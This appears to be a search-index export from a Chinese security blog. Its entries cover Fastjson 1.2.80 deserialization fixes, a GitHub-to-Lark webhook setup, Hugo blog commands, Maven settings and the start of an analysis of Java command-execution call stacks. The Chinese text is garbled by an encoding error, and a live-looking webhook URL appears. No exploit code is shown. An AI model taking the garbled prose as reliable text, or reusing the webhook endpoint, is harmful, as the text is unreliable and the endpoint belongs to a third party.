”ç©¶è¯¥åˆ©ç”¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯ç»•è¿‡é»˜è®¤autoTypeå…³é—­é™åˆ¶ï¼Œæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œé£é™©å½±å“è¾ƒå¤§ã€‚å»ºè®®fastjsonç”¨æˆ·å°½å¿«é‡‡å–å®‰å…¨æªæ–½ä¿éšœç³»ç»Ÿå®‰å…¨ã€‚\nä¿®å¤å»ºè®® å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬1.2.83 1 2 3 4 5  \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;   å¼€å¯safeMode å‚è€ƒï¼šå¦‚ä½•å¼€å¯safemode\njavaä»£ç ä¸­è®¾ç½® 1 2 3 4 5 6 7 8  /* åœ¨1.2.68ä¹‹åçš„ç‰ˆæœ¬ï¼Œfastjsonå¢åŠ äº†safeModeçš„æ”¯æŒã€‚safeModeæ‰“å¼€åï¼Œå®Œå…¨ç¦ç”¨autoTypeã€‚ * å¼€å¯SafeModeä¸‰ç§æ–¹å¼ * 1. ä»£ç é…ç½®ï¼Œå»ºè®®å•ä¾‹å¤„ç† ParserConfig.getGlobalInstance().setSafeMode(true); * 2. å¯åŠ¨åŠ ä¸Š -Dfastjson.parser.safeMode=true * 3. é€šè¿‡fastjson.propertiesæ–‡ä»¶é…ç½® fastjson.parser.safeMode=true * */ * ParserConfig.getGlobalInstance().setAutoTypeSupport(true);   JVMå‚æ•°è®¾ç½® é…ç½®æ–‡ä»¶ 1 2  # fastjson.propertiesfastjson.parser.safeMode=true  ä½¿ç”¨fastjson v2ç‰ˆæœ¬(ä¸v1ç‰ˆæœ¬ä¸å…¼å®¹) å‚è€ƒ Fastjson 1.2.80ç‰ˆæœ¬ååºåˆ—åŒ–æ¼æ´\n","description":"","id":19,"section":"dso","tags":null,"title":"Fastjson 1.2.80ç‰ˆæœ¬ååºåˆ—åŒ–æ¼æ´poc","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/fastjson-1.2.80%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Epoc/"},{"content":"Beijing: â›…ï¸ ğŸŒ¡ï¸+25Â°C ğŸŒ¬ï¸â†˜11km/h\nGithubå‘é€é€šçŸ¥ç»™Lark(webhook) Lark Flowé…ç½® webhooké…ç½® webhook address* 1  https://www.larksuite.com/flow/api/trigger-webhook/0350eb63e7657   webhook params 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194  { \u0026#34;ref\u0026#34;: \u0026#34;refs/heads/gh-pages\u0026#34;, \u0026#34;before\u0026#34;: \u0026#34;9546c62d9dd1374fe6d3fae9ddda03d2888c35d2\u0026#34;, \u0026#34;after\u0026#34;: \u0026#34;5f9d4f2cd0a95360b38e43c7c231e33b54e8f9a5\u0026#34;, \u0026#34;repository\u0026#34;: { \u0026#34;id\u0026#34;: 501187327, \u0026#34;node_id\u0026#34;: \u0026#34;R_kgDOHd-C_w\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;crkmythical.github.io\u0026#34;, \u0026#34;full_name\u0026#34;: \u0026#34;crkmythical/crkmythical.github.io\u0026#34;, \u0026#34;private\u0026#34;: false, \u0026#34;owner\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;82789723+crkmythical@users.noreply.github.com\u0026#34;, \u0026#34;login\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;id\u0026#34;: 82789723, \u0026#34;node_id\u0026#34;: \u0026#34;MDQ6VXNlcjgyNzg5NzIz\u0026#34;, \u0026#34;avatar_url\u0026#34;: \u0026#34;https://avatars.githubusercontent.com/u/82789723?v=4\u0026#34;, \u0026#34;gravatar_id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical\u0026#34;, \u0026#34;html_url\u0026#34;: \u0026#34;https://github.com/crkmythical\u0026#34;, \u0026#34;followers_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/followers\u0026#34;, \u0026#34;following_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/following{/other_user}\u0026#34;, \u0026#34;gists_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/gists{/gist_id}\u0026#34;, \u0026#34;starred_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/starred{/owner}{/repo}\u0026#34;, \u0026#34;subscriptions_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/subscriptions\u0026#34;, \u0026#34;organizations_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/orgs\u0026#34;, \u0026#34;repos_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/repos\u0026#34;, \u0026#34;events_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/events{/privacy}\u0026#34;, \u0026#34;received_events_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/received_events\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;site_admin\u0026#34;: false }, \u0026#34;html_url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;https://crkmythical.github.io\u0026#34;, \u0026#34;fork\u0026#34;: false, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io\u0026#34;, \u0026#34;forks_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/forks\u0026#34;, \u0026#34;keys_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/keys{/key_id}\u0026#34;, \u0026#34;collaborators_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/collaborators{/collaborator}\u0026#34;, \u0026#34;teams_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/teams\u0026#34;, \u0026#34;hooks_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/hooks\u0026#34;, \u0026#34;issue_events_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/issues/events{/number}\u0026#34;, \u0026#34;events_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/events\u0026#34;, \u0026#34;assignees_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/assignees{/user}\u0026#34;, \u0026#34;branches_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/branches{/branch}\u0026#34;, \u0026#34;tags_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/tags\u0026#34;, \u0026#34;blobs_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/git/blobs{/sha}\u0026#34;, \u0026#34;git_tags_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/git/tags{/sha}\u0026#34;, \u0026#34;git_refs_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/git/refs{/sha}\u0026#34;, \u0026#34;trees_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/git/trees{/sha}\u0026#34;, \u0026#34;statuses_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/statuses/{sha}\u0026#34;, \u0026#34;languages_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/languages\u0026#34;, \u0026#34;stargazers_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/stargazers\u0026#34;, \u0026#34;contributors_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/contributors\u0026#34;, \u0026#34;subscribers_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/subscribers\u0026#34;, \u0026#34;subscription_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/subscription\u0026#34;, \u0026#34;commits_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/commits{/sha}\u0026#34;, \u0026#34;git_commits_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/git/commits{/sha}\u0026#34;, \u0026#34;comments_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/comments{/number}\u0026#34;, \u0026#34;issue_comment_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/issues/comments{/number}\u0026#34;, \u0026#34;contents_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/contents/{+path}\u0026#34;, \u0026#34;compare_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/compare/{base}...{head}\u0026#34;, \u0026#34;merges_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/merges\u0026#34;, \u0026#34;archive_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/{archive_format}{/ref}\u0026#34;, \u0026#34;downloads_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/downloads\u0026#34;, \u0026#34;issues_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/issues{/number}\u0026#34;, \u0026#34;pulls_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/pulls{/number}\u0026#34;, \u0026#34;milestones_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/milestones{/number}\u0026#34;, \u0026#34;notifications_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/notifications{?since,all,participating}\u0026#34;, \u0026#34;labels_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/labels{/name}\u0026#34;, \u0026#34;releases_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/releases{/id}\u0026#34;, \u0026#34;deployments_url\u0026#34;: \u0026#34;https://api.github.com/repos/crkmythical/crkmythical.github.io/deployments\u0026#34;, \u0026#34;created_at\u0026#34;: 1654681232, \u0026#34;updated_at\u0026#34;: \u0026#34;2022-06-08T12:55:05Z\u0026#34;, \u0026#34;pushed_at\u0026#34;: 1655189116, \u0026#34;git_url\u0026#34;: \u0026#34;git://github.com/crkmythical/crkmythical.github.io.git\u0026#34;, \u0026#34;ssh_url\u0026#34;: \u0026#34;git@github.com:crkmythical/crkmythical.github.io.git\u0026#34;, \u0026#34;clone_url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io.git\u0026#34;, \u0026#34;svn_url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io\u0026#34;, \u0026#34;homepage\u0026#34;: null, \u0026#34;size\u0026#34;: 5019, \u0026#34;stargazers_count\u0026#34;: 1, \u0026#34;watchers_count\u0026#34;: 1, \u0026#34;language\u0026#34;: null, \u0026#34;has_issues\u0026#34;: true, \u0026#34;has_projects\u0026#34;: true, \u0026#34;has_downloads\u0026#34;: true, \u0026#34;has_wiki\u0026#34;: true, \u0026#34;has_pages\u0026#34;: true, \u0026#34;forks_count\u0026#34;: 0, \u0026#34;mirror_url\u0026#34;: null, \u0026#34;archived\u0026#34;: false, \u0026#34;disabled\u0026#34;: false, \u0026#34;open_issues_count\u0026#34;: 0, \u0026#34;license\u0026#34;: null, \u0026#34;allow_forking\u0026#34;: true, \u0026#34;is_template\u0026#34;: false, \u0026#34;topics\u0026#34;: [ ], \u0026#34;visibility\u0026#34;: \u0026#34;public\u0026#34;, \u0026#34;forks\u0026#34;: 0, \u0026#34;open_issues\u0026#34;: 0, \u0026#34;watchers\u0026#34;: 1, \u0026#34;default_branch\u0026#34;: \u0026#34;main\u0026#34;, \u0026#34;stargazers\u0026#34;: 1, \u0026#34;master_branch\u0026#34;: \u0026#34;main\u0026#34; }, \u0026#34;pusher\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;82789723+crkmythical@users.noreply.github.com\u0026#34; }, \u0026#34;sender\u0026#34;: { \u0026#34;login\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;id\u0026#34;: 82789723, \u0026#34;node_id\u0026#34;: \u0026#34;MDQ6VXNlcjgyNzg5NzIz\u0026#34;, \u0026#34;avatar_url\u0026#34;: \u0026#34;https://avatars.githubusercontent.com/u/82789723?v=4\u0026#34;, \u0026#34;gravatar_id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical\u0026#34;, \u0026#34;html_url\u0026#34;: \u0026#34;https://github.com/crkmythical\u0026#34;, \u0026#34;followers_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/followers\u0026#34;, \u0026#34;following_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/following{/other_user}\u0026#34;, \u0026#34;gists_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/gists{/gist_id}\u0026#34;, \u0026#34;starred_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/starred{/owner}{/repo}\u0026#34;, \u0026#34;subscriptions_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/subscriptions\u0026#34;, \u0026#34;organizations_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/orgs\u0026#34;, \u0026#34;repos_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/repos\u0026#34;, \u0026#34;events_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/events{/privacy}\u0026#34;, \u0026#34;received_events_url\u0026#34;: \u0026#34;https://api.github.com/users/crkmythical/received_events\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;site_admin\u0026#34;: false }, \u0026#34;created\u0026#34;: false, \u0026#34;deleted\u0026#34;: false, \u0026#34;forced\u0026#34;: false, \u0026#34;base_ref\u0026#34;: null, \u0026#34;compare\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io/compare/9546c62d9dd1...5f9d4f2cd0a9\u0026#34;, \u0026#34;commits\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;5f9d4f2cd0a95360b38e43c7c231e33b54e8f9a5\u0026#34;, \u0026#34;tree_id\u0026#34;: \u0026#34;3bbdda9bd5c125e383110477c76bb327eaa25081\u0026#34;, \u0026#34;distinct\u0026#34;: true, \u0026#34;message\u0026#34;: \u0026#34;update Tue Jun 14 14:44:51 CST 2022 crkmythical/Frame@ea9257ec824039439d8f7c72a392de9bc9f340ce\u0026#34;, \u0026#34;timestamp\u0026#34;: \u0026#34;2022-06-14T06:45:16Z\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io/commit/5f9d4f2cd0a95360b38e43c7c231e33b54e8f9a5\u0026#34;, \u0026#34;author\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;crkmythical@users.noreply.github.com\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;crkmythical\u0026#34; }, \u0026#34;committer\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;crkmythical@users.noreply.github.com\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;crkmythical\u0026#34; }, \u0026#34;added\u0026#34;: [ ], \u0026#34;removed\u0026#34;: [ ], \u0026#34;modified\u0026#34;: [ \u0026#34;blog/github-and-webhook-with-lark/index.html\u0026#34; ] } ], \u0026#34;head_commit\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;5f9d4f2cd0a95360b38e43c7c231e33b54e8f9a5\u0026#34;, \u0026#34;tree_id\u0026#34;: \u0026#34;3bbdda9bd5c125e383110477c76bb327eaa25081\u0026#34;, \u0026#34;distinct\u0026#34;: true, \u0026#34;message\u0026#34;: \u0026#34;update Tue Jun 14 14:44:51 CST 2022 crkmythical/Frame@ea9257ec824039439d8f7c72a392de9bc9f340ce\u0026#34;, \u0026#34;timestamp\u0026#34;: \u0026#34;2022-06-14T06:45:16Z\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/crkmythical/crkmythical.github.io/commit/5f9d4f2cd0a95360b38e43c7c231e33b54e8f9a5\u0026#34;, \u0026#34;author\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;crkmythical@users.noreply.github.com\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;crkmythical\u0026#34; }, \u0026#34;committer\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;crkmythical\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;crkmythical@users.noreply.github.com\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;crkmythical\u0026#34; }, \u0026#34;added\u0026#34;: [ ], \u0026#34;removed\u0026#34;: [ ], \u0026#34;modified\u0026#34;: [ \u0026#34;blog/github-and-webhook-with-lark/index.html\u0026#34; ] } }   Lark Message 1  head_commit_message   Github Webhooké…ç½® ","description":"Githubå‘é€é€šçŸ¥ç»™Lark(webhook)","id":20,"section":"blog","tags":null,"title":"Githubå‘é€é€šçŸ¥ç»™Lark(webhook)","uri":"http://crkmythical.github.io/blog/github%E5%8F%91%E9%80%81%E9%80%9A%E7%9F%A5%E7%BB%99larkwebhook/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+19Â°C ğŸŒ¬ï¸â†“4km/h\nhugoæ­å»ºåšå®¢å…¨è®°å½•  [[https://imcaviare.com/post/auto-deploy-hugo/][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹ä¸€]] [[https://cloud.tencent.com/developer/article/1647964?from=article.detail.1970808][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹äºŒ]] [[https://www.jianshu.com/p/7c3f31d44b1d][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹ä¸‰]]  hugoå®‰è£… 1  brew install hugo git-lfs   åˆå§‹åŒ–åšå®¢ç›®å½• 1 2 3 4 5 6 7 8 9 10 11 12 13 14  hugo new site myBlog -f toml \u0026amp;\u0026amp; cd myBlog git init git lfs install # æ˜¯å¦æ”¯æŒå¤§æ–‡ä»¶ git submodule add https://github.com/zzossig/hugo-theme-zdoc.git themes/zdoc git submodule update --init --recursive #è‹¥å…‹éš†ä»–äººåšå®¢ï¼Œéœ€æ‰§è¡Œ åˆå§‹åŒ–å’ŒåŒæ­¥ä¸»é¢˜ä¿®æ”¹ git submodule update --remote # åŒæ­¥ä¸»é¢˜ä¿®æ”¹ cp -rf themes/zdoc/exampleSite/* ./ cp -rf themes/zdoc/archetypes ./ git add * git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin git@github.com:\u0026lt;user\u0026gt;/Repo.git git push -u origin main   åˆ›å»º .gitignoreæ–‡ä»¶ 1 2 3 4 5 6 7 8  cat \u0026lt;\u0026lt;EOF \u0026gt; .gitignore public/* .DS_Store archetypes/* layouts/* resources/* static/* EOF   [[https://zzo-docs.vercel.app/zdoc/configuration/configfiles/][é…ç½®åšå®¢]]\n","description":"å¦‚ä½•ä½¿ç”¨hugoæ­å»ºåšå®¢ï¼ŒåŠè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼Œæ–‡æ¡£ä¸­å¿ƒ","id":21,"section":"blog","tags":["hugo"],"title":"hugoæ­å»ºåšå®¢å…¨è®°å½•","uri":"http://crkmythical.github.io/blog/hugo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%85%A8%E8%AE%B0%E5%BD%95/"},{"content":"Beijing: â˜ï¸ ğŸŒ¡ï¸+23Â°C ğŸŒ¬ï¸â†–11km/h\nJavaä»£ç å®¡è®¡ å¦‚ä½•ä½¿ç”¨IDEAæŸ¥çœ‹jaråŒ…æºç   å°†æ‰€éœ€ xxx.jaråŒ…æ”¾å…¥æ–°ç›®å½•ä¸­ æ‰“å¼€IDEA,ç‚¹å‡»open,æ‰“å¼€jaråŒ…æ‰€åœ¨ç›®å½•A å³é”®è¯¥jaråŒ…, ç‚¹å‡» Add as Library...  Centos\n","description":"","id":22,"section":"dso","tags":null,"title":"Javaä»£ç å®¡è®¡","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+33Â°C ğŸŒ¬ï¸â†™11km/h\nMavené…ç½®æ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\u0026#34;\u0026gt; \u0026lt;!-- é»˜è®¤çš„å€¼æ˜¯${user.home}/.m2/repository --\u0026gt; \u0026lt;localRepository\u0026gt;D:/Program/.m2/repository\u0026lt;/localRepository\u0026gt; \u0026lt;!-- å¦‚æœMavenè¦è¯•å›¾ä¸ç”¨æˆ·äº¤äº’æ¥å¾—åˆ°è¾“å…¥å°±è®¾ç½®ä¸ºtrueï¼Œå¦åˆ™å°±è®¾ç½®ä¸ºfalseï¼Œé»˜è®¤ä¸ºtrueã€‚ --\u0026gt; \u0026lt;interactiveMode\u0026gt;true\u0026lt;/interactiveMode\u0026gt; \u0026lt;!-- å¦‚æœMavenä½¿ç”¨${user.home}/.m2/plugin-registry.xmlæ¥ç®¡ç†pluginçš„ç‰ˆæœ¬ï¼Œå°±è®¾ç½®ä¸ºtrueï¼Œé»˜è®¤ä¸ºfalseã€‚ --\u0026gt; \u0026lt;usePluginRegistry\u0026gt;false\u0026lt;/usePluginRegistry\u0026gt; \u0026lt;!-- å¦‚æœæ„å»ºç³»ç»Ÿè¦åœ¨ç¦»çº¿æ¨¡å¼ä¸‹å·¥ä½œï¼Œè®¾ç½®ä¸ºtrueï¼Œé»˜è®¤ä¸ºfalseã€‚ å¦‚æœæ„å»ºæœåŠ¡å™¨å› ä¸ºç½‘ç»œæ•…éšœæˆ–è€…å®‰å…¨é—®é¢˜ä¸èƒ½ä¸è¿œç¨‹ä»“åº“ç›¸è¿ï¼Œé‚£ä¹ˆè¿™ä¸ªè®¾ç½®æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ --\u0026gt; \u0026lt;offline\u0026gt;false\u0026lt;/offline\u0026gt; \u0026lt;mirrors\u0026gt; \u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;nexus-aliyun\u0026lt;/id\u0026gt; \u0026lt;mirrorOf\u0026gt;central\u0026lt;/mirrorOf\u0026gt; \u0026lt;name\u0026gt;Nexus aliyun\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; \u0026lt;/mirror\u0026gt; \u0026lt;/mirrors\u0026gt; \u0026lt;!-- settings.xmlä¸­çš„profileæ˜¯pom.xmlä¸­çš„profileçš„ç®€æ´å½¢å¼ã€‚ å®ƒåŒ…å«äº†æ¿€æ´»(activation)ï¼Œä»“åº“(repositories)ï¼Œæ’ä»¶ä»“åº“(pluginRepositories)å’Œå±æ€§(properties)å…ƒç´ ã€‚ profileå…ƒç´ ä»…åŒ…å«è¿™å››ä¸ªå…ƒç´ æ˜¯å› ä¸ºä»–ä»¬æ¶‰åŠåˆ°æ•´ä¸ªçš„æ„å»ºç³»ç»Ÿï¼Œè€Œä¸æ˜¯ä¸ªåˆ«çš„POMé…ç½®ã€‚ å¦‚æœsettingsä¸­çš„profileè¢«æ¿€æ´»ï¼Œé‚£ä¹ˆå®ƒçš„å€¼å°†é‡è½½POMæˆ–è€…profiles.xmlä¸­çš„ä»»ä½•ç›¸ç­‰IDçš„profilesã€‚ --\u0026gt; \u0026lt;profiles\u0026gt; \u0026lt;profile\u0026gt; \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; \u0026lt;activation\u0026gt; \u0026lt;activeByDefault\u0026gt;true\u0026lt;/activeByDefault\u0026gt; \u0026lt;jdk\u0026gt;1.8\u0026lt;/jdk\u0026gt; \u0026lt;/activation\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-milestone\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestone Repository\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;http://repo.spring.io/milestone\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;layout\u0026gt;default\u0026lt;/layout\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-snapshot\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshot Repository\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;http://repo.spring.io/snapshot\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;layout\u0026gt;default\u0026lt;/layout\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;/profile\u0026gt; \u0026lt;/profiles\u0026gt; \u0026lt;!-- activationsæ˜¯profileçš„å…³é”®ï¼Œå°±åƒPOMä¸­çš„profilesï¼Œprofileçš„èƒ½åŠ›åœ¨äºå®ƒåœ¨ç‰¹å®šæƒ…å†µä¸‹å¯ä»¥ä¿®æ”¹ä¸€äº›å€¼ã€‚ è€Œè¿™äº›æƒ…å†µæ˜¯é€šè¿‡activationæ¥æŒ‡å®šçš„ã€‚ --\u0026gt; \u0026lt;!-- \u0026lt;activeProfiles/\u0026gt; --\u0026gt; \u0026lt;/settings\u0026gt;   ","description":"","id":23,"section":"dso","tags":null,"title":"Mavené…ç½®æ–‡ä»¶","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/maven%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"content":"Beijing: ğŸŒ« ğŸŒ¡ï¸+28Â°C ğŸŒ¬ï¸â†7km/h\nJavaä¸­å‘½ä»¤æ‰§è¡Œè°ƒç”¨æ ˆåˆ†æ Javaä¸­å‘½ä»¤æ‰§è¡Œå¯ä»¥åˆ†ä¸ºå››ç§æ–¹æ³•,åˆ†åˆ«æ˜¯\n java.lang.Runtime#exec() java.lang.ProcessBuilder#start() java.lang.ProcessImpl#start() JNIæ–¹å¼è°ƒç”¨åŠ¨æ€é“¾æ¥åº“  åœ¨Javaååºåˆ—åŒ–ä¸­ç”¨åˆ°æœ€å¤šçš„å°±æ˜¯Runtimeç±»çš„execæ–¹æ³•æ¥å‘½ä»¤æ‰§è¡Œäº†,\nRuntime.getRuntime().execå…±æœ‰å…­ä¸ªé‡è½½æ–¹æ³•ï¼š\nå‘½ä»¤æ‰§è¡Œæ–¹å¼1. java.lang.Runtime#exec() Runtime#exec()æœ‰å…­ä¸ªé‡è½½æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // 